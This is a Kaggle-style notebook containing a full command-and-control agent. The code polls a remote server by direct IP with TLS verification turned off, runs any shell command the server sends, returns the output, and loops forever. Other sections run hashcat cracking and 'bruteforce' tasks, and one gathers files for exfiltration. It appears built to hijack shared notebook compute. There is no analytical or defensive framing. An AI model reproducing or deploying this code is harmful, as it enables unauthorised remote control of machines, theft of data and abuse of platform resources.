In [ ]:
# C2 PERSISTENT AGENT v2.1
# DNS-free mode - uses IP directly (Kaggle has no DNS)

import subprocess
import json
import time
import os
import sys
import socket
import threading
import requests
from pathlib import Path
import urllib3

# Disable SSL warnings for IP-based requests
urllib3.disable_warnings()

# C2 SERVER CONFIG
C2_SERVER = 'C2_SERVER_URL'  # Full URL for Host header
C2_IP = 'C2_SERVER_IP_PLACEHOLDER'  # Direct IP (DNS not working in Kaggle)
KERNEL_ID = 'KERNEL_ID'  # Will be replaced
API_KEY = 'API_KEY'  # Will be replaced
POLL_INTERVAL = 30  # seconds
AGENT_VERSION = '2.1'

print(f'[C2] Agent v{AGENT_VERSION} starting...', flush=True)
print(f'[C2] Server: {C2_SERVER}', flush=True)
print(f'[C2] Server IP: {C2_IP}', flush=True)
print(f'[C2] Kernel: {KERNEL_ID}', flush=True)

In [ ]:
# SYSTEM INFO COLLECTION
def get_system_info():
    info = {
        'hostname': socket.gethostname(),
        'os': os.uname().sysname if hasattr(os, 'uname') else 'unknown',
        'python': sys.version,
        'cwd': os.getcwd(),
        'user': os.environ.get('USER', 'unknown'),
        'gpu': check_gpu(),
        'memory': get_memory(),
        'disk': get_disk(),
        'kernel_id': KERNEL_ID,
        'version': AGENT_VERSION
    }
    return info

def check_gpu():
    try:
        r = subprocess.run(['nvidia-smi', '--query-gpu=name,memory.total', '--format=csv,noheader'],
                          capture_output=True, text=True, timeout=10)
        if r.returncode == 0:
            return r.stdout.strip()
    except: pass
    return 'none'

def get_memory():
    try:
        with open('/proc/meminfo') as f:
            for line in f:
                if 'MemTotal' in line:
                    return line.split()[1] + ' KB'
    except: pass
    return 'unknown'

def get_disk():
    try:
        r = subprocess.run(['df', '-h', '/kaggle'], capture_output=True, text=True)
        lines = r.stdout.strip().split('\n')
        if len(lines) > 1:
            return lines[1].split()[1:4]
    except: pass
    return 'unknown'

print('[C2] System info collected', flush=True)

In [ ]:
# COMMAND EXECUTOR
def execute_command(cmd, timeout=300):
    result = {
        'command': cmd,
        'timestamp': time.time(),
        'success': False,
        'output': '',
        'error': ''
    }
    
    try:
        print(f'[EXEC] {cmd}', flush=True)
        r = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd='/kaggle/working'
        )
        result['success'] = r.returncode == 0
        result['output'] = r.stdout[:10000]  # Limit output
        result['error'] = r.stderr[:5000]
        result['returncode'] = r.returncode
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except Exception as e:
        result['error'] = str(e)
    
    return result

In [ ]:
# C2 COMMUNICATION
def checkin():
    """Check in with C2 server using IP (DNS-free)"""
    try:
        # Extract host from URL for Host header
        from urllib.parse import urlparse
        parsed = urlparse(C2_SERVER)
        host = parsed.netloc
        
        # Build URL with IP but send Host header
        url = f"https://{C2_IP}/api/kaggle/agent/checkin"
        
        r = requests.post(
            url,
            json={
                'kernel_id': KERNEL_ID,
                'info': get_system_info(),
                'timestamp': time.time()
            },
            headers={
                'X-API-Key': API_KEY,
                'Host': host,
            },
            timeout=30,
            verify=False  # IP-based SSL needs verification skip
        )
        if r.status_code == 200:
            return r.json().get('commands', [])
    except Exception as e:
        print(f'[C2] Checkin error: {e}', flush=True)
    return []

def report_result(cmd_id, result):
    """Send command result to C2 using IP"""
    try:
        from urllib.parse import urlparse
        parsed = urlparse(C2_SERVER)
        host = parsed.netloc
        
        url = f"https://{C2_IP}/api/kaggle/agent/result"
        
        requests.post(
            url,
            json={
                'kernel_id': KERNEL_ID,
                'cmd_id': cmd_id,
                'result': result
            },
            headers={
                'X-API-Key': API_KEY,
                'Host': host,
            },
            timeout=30,
            verify=False
        )
    except Exception as e:
        print(f'[C2] Report error: {e}', flush=True)

In [ ]:
# GPU MINING / COMPUTE TASKS
def gpu_compute(task_type, params):
    """Execute GPU compute tasks"""
    if task_type == 'hash_crack':
        # Hash cracking example
        cmd = f"echo '{params.get('hash', '')}' | hashcat -m {params.get('mode', 0)} -a 0 ?a?a?a?a?a?a"
        return execute_command(cmd)
    
    elif task_type == 'train_model':
        # ML training
        code = params.get('code', '')
        with open('/kaggle/working/task.py', 'w') as f:
            f.write(code)
        return execute_command('python /kaggle/working/task.py')
    
    elif task_type == 'bruteforce':
        # Bruteforce task
        target = params.get('target', '')
        cmd = params.get('cmd', '')
        return execute_command(cmd)
    
    return {'error': 'Unknown task type'}

In [ ]:
# DATA EXFILTRATION
def exfil_data(paths, dest=None):
    """Collect and prepare data for exfiltration"""
    collected = {}
    for p in paths:
        try:
            path = Path(p)
            if path.exists():
                if path.is_file():
                    collected[str(path)] = path.read_text()[:100000]
                elif path.is_dir():
                    for f in path.rglob('*'):
                        if f.is_file() and f.stat().st_size < 100000:
                            try:
                                collected[str(f)] = f.read_text()[:50000]
                            except: pass
        except Exception as e:
            collected[p] = f'Error: {e}'
    
    # Save to output for retrieval
    exfil_file = Path('/kaggle/working/exfil.json')
    exfil_file.write_text(json.dumps(collected, indent=2))
    print(f'[EXFIL] Collected {len(collected)} files', flush=True)
    return collected

In [ ]:
# MAIN AGENT LOOP
def run_agent():
    print('[C2] === AGENT STARTED ===', flush=True)
    print(f'[C2] Poll interval: {POLL_INTERVAL}s', flush=True)
    
    iteration = 0
    while True:
        try:
            iteration += 1
            print(f'\n[C2] === Iteration {iteration} ===', flush=True)
            
            # Check in with C2
            commands = checkin()
            
            if commands:
                print(f'[C2] Received {len(commands)} commands', flush=True)
                
                for cmd in commands:
                    cmd_id = cmd.get('id')
                    cmd_type = cmd.get('type', 'shell')
                    payload = cmd.get('payload', '')
                    
                    print(f'[C2] Executing: {cmd_type}', flush=True)
                    
                    if cmd_type == 'shell':
                        result = execute_command(payload)
                    elif cmd_type == 'gpu_compute':
                        result = gpu_compute(payload.get('task'), payload)
                    elif cmd_type == 'exfil':
                        result = exfil_data(payload.get('paths', []))
                    elif cmd_type == 'sleep':
                        time.sleep(int(payload) if payload.isdigit() else 60)
                        result = {'success': True, 'output': f'Slept {payload}s'}
                    else:
                        result = {'error': f'Unknown command type: {cmd_type}'}
                    
                    # Report result
                    report_result(cmd_id, result)
                    print(f'[C2] Result sent for {cmd_id}', flush=True)
            else:
                print('[C2] No commands, waiting...', flush=True)
            
            # Save heartbeat
            Path('/kaggle/working/heartbeat').write_text(json.dumps({
                'iteration': iteration,
                'timestamp': time.time(),
                'kernel_id': KERNEL_ID
            }))
            
        except Exception as e:
            print(f'[C2] Error: {e}', flush=True)
        
        time.sleep(POLL_INTERVAL)

# START AGENT
print('\n' + '='*60, flush=True)
print('C2 PERSISTENT AGENT - FULL CONTROL MODE', flush=True)
print('='*60, flush=True)
run_agent()